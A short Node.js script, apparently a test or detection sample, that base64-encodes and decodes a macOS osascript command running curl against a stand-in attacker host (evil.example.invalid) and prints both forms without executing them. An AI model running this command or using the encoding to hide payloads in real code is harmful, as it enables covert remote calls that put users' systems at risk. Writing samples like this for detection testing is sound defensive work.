#!/usr/bin/env node
const encoded = Buffer.from("osascript -e 'do shell script \"curl https://evil.example.invalid\"'", "utf8").toString("base64");
const decoded = Buffer.from(encoded, "base64").toString("utf8");

console.log("[string-only] obfuscated payload sample:", encoded);
console.log("[string-only] decoded payload sample:", decoded);
console.log("[dry-run] no eval/exec invoked");
